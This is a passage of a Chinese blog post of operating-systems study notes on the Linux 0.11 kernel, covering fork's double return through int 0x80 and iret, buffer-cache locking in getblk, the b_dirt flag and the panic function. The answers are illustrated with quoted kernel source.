class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\tljmp通过CPU的任务门机制并为实际使用任务门,它把CPU的各个寄存器值保存在当前进程的TSS中,将要转换的进程的TSS数据以及LDT的代码段、数据段描述符数据恢复给CPU的各个寄存器,从而实现进程的切换</p>\n<p>​\t\ta代表EIP、b对应cs</p>\n<h1 id=\"24-进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for-pause-，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。\"><a href=\"#24-进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for-pause-，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。\" class=\"headerlink\" title=\"24.进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for(;;) pause()，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。\"></a>24.进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for(;;) pause()，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。</h1><p>p2 p107</p>\n<p>​\t这个题的话,需要追踪一下fork的流程</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">init/main.c</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"title function_\">if</span> <span class=\"params\">(!fork())</span> &#123;\t\t<span class=\"comment\">/* we count on this going ok */</span></span><br><span class=\"line\">\t\tinit(); <span class=\"comment\">//进程1</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> _syscall0(<span class=\"type\">int</span>,fork)</span><br><span class=\"line\"></span><br><span class=\"line\">进入到include/unistd.h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _syscall0(type,name) \\\\</span></span><br><span class=\"line\"><span class=\"meta\">type name(void) \\\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123; \\\\</span></span><br><span class=\"line\"><span class=\"meta\">long __res; \\\\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ volatile (<span class=\"string\">&quot;int $0x80&quot;</span> \\\\ <span class=\"comment\">//int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0</span></span></span><br><span class=\"line\">\t: <span class=\"string\">&quot;=a&quot;</span> (__res) \\\\</span><br><span class=\"line\">\t: <span class=\"string\">&quot;0&quot;</span> (__NR_#<span class=\"meta\">#name)); \\\\ <span class=\"comment\">//把name 贴过来</span></span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__res &gt;= <span class=\"number\">0</span>) \\\\</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (type) __res; \\\\</span><br><span class=\"line\">errno = -__res; \\\\</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>; \\\\</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">然后通过<span class=\"type\">int</span> $<span class=\"number\">0x80</span></span><br><span class=\"line\"><span class=\"type\">int</span> $<span class=\"number\">0x80</span> p71 系统调用总入口</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> $<span class=\"number\">0x80</span></span><br><span class=\"line\">kernel/system_call.s</span><br><span class=\"line\">.align <span class=\"number\">2</span></span><br><span class=\"line\">_system_call:</span><br><span class=\"line\">\tcmpl $nr_system_calls<span class=\"number\">-1</span>,%eax ;核实独立访问?</span><br><span class=\"line\">\tja bad_sys_call</span><br><span class=\"line\">\tpush %ds           ;对齐??</span><br><span class=\"line\">\tpush %es</span><br><span class=\"line\">\tpush %fs</span><br><span class=\"line\">\tpushl %edx</span><br><span class=\"line\">\tpushl %ecx\t\t<span class=\"meta\"># push %ebx,%ecx,%edx as parameters</span></span><br><span class=\"line\">\tpushl %ebx\t\t<span class=\"meta\"># to the system call</span></span><br><span class=\"line\">\tmovl $<span class=\"number\">0x10</span>,%edx\t\t<span class=\"meta\"># set up ds,es to kernel space</span></span><br><span class=\"line\">\tmov %dx,%ds</span><br><span class=\"line\">\tmov %dx,%es</span><br><span class=\"line\">\tmovl $<span class=\"number\">0x17</span>,%edx\t\t<span class=\"meta\"># fs points to local data space</span></span><br><span class=\"line\">\tmov %dx,%fs</span><br><span class=\"line\">\tcall _sys_call_table(,%eax,<span class=\"number\">4</span>) ; 从这里过去的</span><br><span class=\"line\">\tpushl %eax</span><br><span class=\"line\">\tmovl _current,%eax</span><br><span class=\"line\">\tcmpl $<span class=\"number\">0</span>,state(%eax)\t\t<span class=\"meta\"># state</span></span><br><span class=\"line\">\tjne reschedule</span><br><span class=\"line\">\tcmpl $<span class=\"number\">0</span>,counter(%eax)\t\t<span class=\"meta\"># counter</span></span><br><span class=\"line\">\tje reschedule</span><br><span class=\"line\">ret_from_sys_call:</span><br><span class=\"line\">\tmovl _current,%eax\t\t<span class=\"meta\"># task[0] cannot have signals</span></span><br><span class=\"line\">\tcmpl _task,%eax</span><br><span class=\"line\">\tje <span class=\"number\">3f</span></span><br><span class=\"line\">\tcmpw $<span class=\"number\">0x0f</span>,CS(%esp)\t\t<span class=\"meta\"># was old code segment supervisor ?</span></span><br><span class=\"line\">\tjne <span class=\"number\">3f</span></span><br><span class=\"line\">\tcmpw $<span class=\"number\">0x17</span>,OLDSS(%esp)\t\t<span class=\"meta\"># was stack segment = 0x17 ?</span></span><br><span class=\"line\">\tjne <span class=\"number\">3f</span></span><br><span class=\"line\">\tmovl signal(%eax),%ebx</span><br><span class=\"line\">\tmovl blocked(%eax),%ecx</span><br><span class=\"line\">\tnotl %ecx</span><br><span class=\"line\">\tandl %ebx,%ecx</span><br><span class=\"line\">\tbsfl %ecx,%ecx</span><br><span class=\"line\">\tje <span class=\"number\">3f</span></span><br><span class=\"line\">\tbtrl %ecx,%ebx</span><br><span class=\"line\">\tmovl %ebx,signal(%eax)</span><br><span class=\"line\">\tincl %ecx</span><br><span class=\"line\">\tpushl %ecx</span><br><span class=\"line\">\tcall _do_signal</span><br><span class=\"line\">\tpopl %eax</span><br><span class=\"line\"><span class=\"number\">3</span>:\tpopl %eax</span><br><span class=\"line\">\tpopl %ebx</span><br><span class=\"line\">\tpopl %ecx</span><br><span class=\"line\">\tpopl %edx</span><br><span class=\"line\">\tpop %fs</span><br><span class=\"line\">\tpop %es</span><br><span class=\"line\">\tpop %ds</span><br><span class=\"line\">\tiret    </span><br><span class=\"line\">    </span><br><span class=\"line\">_sys_call_table是在这里:include/linux/sys.h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">int</span> sys_fork(); <span class=\"comment\">//对应 kernel/system_call.s中的_sys_fork</span></span><br><span class=\"line\"></span><br><span class=\"line\">fn_ptr sys_call_table[] = &#123; sys_setup, sys_exit, sys_fork, sys_read,</span><br><span class=\"line\">sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,....&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call的函数对应着这个:kernel/system_call.s</span><br><span class=\"line\"></span><br><span class=\"line\">.align <span class=\"number\">2</span> ;对齐的意思 </span><br><span class=\"line\">_sys_fork:</span><br><span class=\"line\">\tcall _find_empty_process ; kernel/fork.c 寻找空的进程任务号 task[i]</span><br><span class=\"line\">\ttestl %eax,%eax  ;<span class=\"number\">1</span></span><br><span class=\"line\">\tjs <span class=\"number\">1f</span> ; f d 前后的意思</span><br><span class=\"line\">\tpush %gs</span><br><span class=\"line\">\tpushl %esi</span><br><span class=\"line\">\tpushl %edi</span><br><span class=\"line\">\tpushl %ebp</span><br><span class=\"line\">\tpushl %eax</span><br><span class=\"line\">\tcall _copy_process ;操作系统核心函数!!!复制进程!!!!!!</span><br><span class=\"line\">\taddl $<span class=\"number\">20</span>,%esp</span><br><span class=\"line\"><span class=\"number\">1</span>:\tret</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t注意,当_sys_fork执行完之后,会回到 _system_call 继续往下执行,执行到下面一条语句的时候跳转</p>\n<p>​\t\tje 3f           ; 如果当前进程是进程0,跳转到下面的3处执行,现在是进程0,所以跳转</p>\n<p>​\t\t3处最后的iret会把ss、esp、eflags、cs、eip弹出,eip存储的是_syscall0中int $0x80的下一行,也就是if (__res &gt;&#x3D; 0)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.align <span class=\"number\">2</span></span><br><span class=\"line\">_system_call:</span><br><span class=\"line\">...........</span><br><span class=\"line\">\tcall _sys_call_table(,%eax,<span class=\"number\">4</span>) ; 从这里过去的</span><br><span class=\"line\">\tpushl %eax         ; 回到这里!!</span><br><span class=\"line\">\tmovl _current,%eax</span><br><span class=\"line\">\tcmpl $<span class=\"number\">0</span>,state(%eax)\t\t<span class=\"meta\"># state</span></span><br><span class=\"line\">\tjne reschedule</span><br><span class=\"line\">\tcmpl $<span class=\"number\">0</span>,counter(%eax)\t\t<span class=\"meta\"># counter</span></span><br><span class=\"line\">\tje reschedule</span><br><span class=\"line\">ret_from_sys_call:</span><br><span class=\"line\">\tmovl _current,%eax\t\t<span class=\"meta\"># task[0] cannot have signals</span></span><br><span class=\"line\">\tcmpl _task,%eax</span><br><span class=\"line\">\tje <span class=\"number\">3f</span>           ; 如果当前进程是进程<span class=\"number\">0</span>,跳转到下面的<span class=\"number\">3</span>处执行,现在是进程<span class=\"number\">0</span>,所以跳转</span><br><span class=\"line\">\tcmpw $<span class=\"number\">0x0f</span>,CS(%esp)\t\t<span class=\"meta\"># was old code segment supervisor ?</span></span><br><span class=\"line\">\tjne <span class=\"number\">3f</span></span><br><span class=\"line\">\tcmpw $<span class=\"number\">0x17</span>,OLDSS(%esp)\t\t<span class=\"meta\"># was stack segment = 0x17 ?</span></span><br><span class=\"line\">\tjne <span class=\"number\">3f</span></span><br><span class=\"line\">\tmovl <span class=\"title function_\">signal</span><span class=\"params\">(%eax)</span>,%ebx</span><br><span class=\"line\">\tmovl <span class=\"title function_\">blocked</span><span class=\"params\">(%eax)</span>,%ecx</span><br><span class=\"line\">\tnotl %ecx</span><br><span class=\"line\">\tandl %ebx,%ecx</span><br><span class=\"line\">\tbsfl %ecx,%ecx</span><br><span class=\"line\">\tje 3f</span><br><span class=\"line\">\tbtrl %ecx,%ebx</span><br><span class=\"line\">\tmovl %ebx,<span class=\"title function_\">signal</span><span class=\"params\">(%eax)</span></span><br><span class=\"line\">\tincl %ecx</span><br><span class=\"line\">\tpushl %ecx</span><br><span class=\"line\">\tcall _do_signal</span><br><span class=\"line\">\tpopl %eax</span><br><span class=\"line\">3:\tpopl %eax</span><br><span class=\"line\">\tpopl %ebx</span><br><span class=\"line\">\tpopl %ecx</span><br><span class=\"line\">\tpopl %edx</span><br><span class=\"line\">\tpop %fs</span><br><span class=\"line\">\tpop %es</span><br><span class=\"line\">\tpop %ds</span><br><span class=\"line\">\tiret</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t这个时候,res就是eax,eax是哪里得到的呢? 是在_system_call的时候(也就是int $0x80的时候),call完了sys_fork的时候,sys_fork返回时,执行的pushl %eax, sys_fork的返回值是last_pid,也就是创建的的pid,此时就是1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kernel/system_call.s</span><br><span class=\"line\">.align <span class=\"number\">2</span></span><br><span class=\"line\">_system_call:</span><br><span class=\"line\">\t....</span><br><span class=\"line\">\tcall _sys_call_table(,%eax,<span class=\"number\">4</span>) ; 从这里过去的</span><br><span class=\"line\">\tpushl %eax</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _syscall0(type,name) \\\\</span></span><br><span class=\"line\"><span class=\"meta\">type name(void) \\\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123; \\\\</span></span><br><span class=\"line\"><span class=\"meta\">long __res; \\\\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ volatile (<span class=\"string\">&quot;int $0x80&quot;</span> \\\\ <span class=\"comment\">//int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0</span></span></span><br><span class=\"line\">\t: <span class=\"string\">&quot;=a&quot;</span> (__res) \\\\</span><br><span class=\"line\">\t: <span class=\"string\">&quot;0&quot;</span> (__NR_#<span class=\"meta\">#name)); \\\\ <span class=\"comment\">//把name 贴过来</span></span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__res &gt;= <span class=\"number\">0</span>) \\\\</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (type) __res; \\\\</span><br><span class=\"line\">errno = -__res; \\\\</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>; \\\\</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t调用完了fork回到main,fork的返回值是1,所以!fork()是0,不进入到里面执行,进入到下面的pause</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (! fork()) &#123;\t\t<span class=\"comment\">/* we count on this going ok */</span></span><br><span class=\"line\">\t\tinit(); <span class=\"comment\">//进程1</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(;;) pause(); <span class=\"comment\">//这一行是进程0的代码</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kernel/sched.h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sys_pause</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tcurrent-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class=\"line\">\tschedule();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t进入schedule调度函数</p>\n<h1 id=\"25、打开保护模式、分页后，线性地址到物理地址是如何转换的？\"><a href=\"#25、打开保护模式、分页后，线性地址到物理地址是如何转换的？\" class=\"headerlink\" title=\"25、打开保护模式、分页后，线性地址到物理地址是如何转换的？\"></a>25、打开保护模式、分页后，线性地址到物理地址是如何转换的？</h1><h1 id=\"26、getblk函数中，申请空闲缓冲块的标准就是b-count为0，而申请到之后，为什么在wait-on-buffer-bh-后又执行if（bh-gt-b-count）来判断b-count是否为0？\"><a href=\"#26、getblk函数中，申请空闲缓冲块的标准就是b-count为0，而申请到之后，为什么在wait-on-buffer-bh-后又执行if（bh-gt-b-count）来判断b-count是否为0？\" class=\"headerlink\" title=\"26、getblk函数中，申请空闲缓冲块的标准就是b_count为0，而申请到之后，为什么在wait_on_buffer(bh)后又执行if（bh-&gt;b_count）来判断b_count是否为0？\"></a>26、getblk函数中，申请空闲缓冲块的标准就是b_count为0，而申请到之后，为什么在wait_on_buffer(bh)后又执行if（bh-&gt;b_count）来判断b_count是否为0？</h1><p>p114</p>\n<p>​\t\t这个要看wait_on_buffer函数的功能了,它里面有sleep_on函数,而sleep_on函数里面包含了schedule函数,虽然现在的缓冲块是合适的,但是有可能在睡眠阶段的时候被别的任务占用,所以在使用之前需要判断是否被修改了,修改的话就需要等待解锁</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fs/buffer.c</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">wait_on_buffer</span><span class=\"params\">(<span class=\"keyword\">struct</span> buffer_head * bh)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tcli();</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (bh-&gt;b_lock)</span><br><span class=\"line\">\t\tsleep_on(&amp;bh-&gt;b_wait); <span class=\"comment\">//bh在哪? bh全局的,buf init那里</span></span><br><span class=\"line\">\t<span class=\"comment\">//不要傻等,切进程, 有主动轮询变为被动响应</span></span><br><span class=\"line\">\tsti();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kernel/sched.h</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sleep_on</span><span class=\"params\">(<span class=\"keyword\">struct</span> task_struct **p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> *<span class=\"title\">tmp</span>;</span></span><br><span class=\"line\"><span class=\"comment\">// 有的是请求项 有的是缓冲块等待队列</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (current == &amp;(init_task.task))</span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class=\"line\">\ttmp = *p; <span class=\"comment\">// bh-&gt;b_wait</span></span><br><span class=\"line\">\t*p = current;</span><br><span class=\"line\">\tcurrent-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class=\"line\">\tschedule();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tmp)</span><br><span class=\"line\">\t\ttmp-&gt;state=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"27、b-dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。\"><a href=\"#27、b-dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。\" class=\"headerlink\" title=\"27、b_dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。\"></a>27、b_dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。</h1><p>p331</p>\n<p>​\t\t要回答这个问题先得了解下b_uptodate,b_uptodate设置为1的时候(P326),标志着缓冲块中的数据是基于硬盘数据块的,内核可以放心地支持进程与缓冲块进行数据交互.</p>\n<p>​\t\t此时,读操作不会改写缓冲块的数据,所以不会影响硬盘数据块的内容,如果写的话,就需要改变缓冲块的内容,此时,将b_dirt置为1,在同步前,当然可以继续读写了..我觉得这很显然.</p>\n<p>​\t\t老师大概想表达的意思是,b_dirt虽然被置为1了,但是在此之前,硬盘-&gt;缓冲块这一路径已经同步过了,没有改写的部分是同步的,改写的那肯定就是改写的,所以不影响我们继续读写,<font color=\"red\"> b_uptodate仍然设置为1,它为1就标志着我们仍然可以读写</font></p>\n<h2 id=\"代码证据\"><a href=\"#代码证据\" class=\"headerlink\" title=\"代码证据\"></a>代码证据</h2><p>​\t\t想要的证据是说读写都不需要检查b_dirt位嘛?或者说改变了b_dirt不会改变b_uptodate?</p>\n<p><em>P331</em>的<em>file_write</em> </p>\n<p><em>P314</em>的 <em>file_read</em> </p>\n<p><em>P330</em>的 <em>bread getblk</em> </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？\"><a href=\"#28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？\" class=\"headerlink\" title=\"28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？\"></a>28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？</h1><p>赵炯p175</p>\n<p>​\t\t</p>\n<p>kernel&#x2F;panic.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> *  linux/kernel/panic.c</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *  (C) 1991  Linus Torvalds</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * This function is used through-out the kernel (includeinh mm and fs)</span></span><br><span class=\"line\"><span class=\"comment\"> * to indicate a major problem.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/sched.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sys_sync</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;\t<span class=\"comment\">/* it&#x27;s really int */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">volatile</span> <span class=\"type\">void</span> <span class=\"title function_\">panic</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> * s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintk(<span class=\"string\">&quot;Kernel panic: %s\\n\\r&quot;</span>,s);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (current == task[<span class=\"number\">0</span>])</span><br><span class=\"line\">\t\tprintk(<span class=\"string\">&quot;In swapper task - not syncing\\n\\r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tsys_sync();</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>sys_sync 在 fs&#x2F;buffer.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 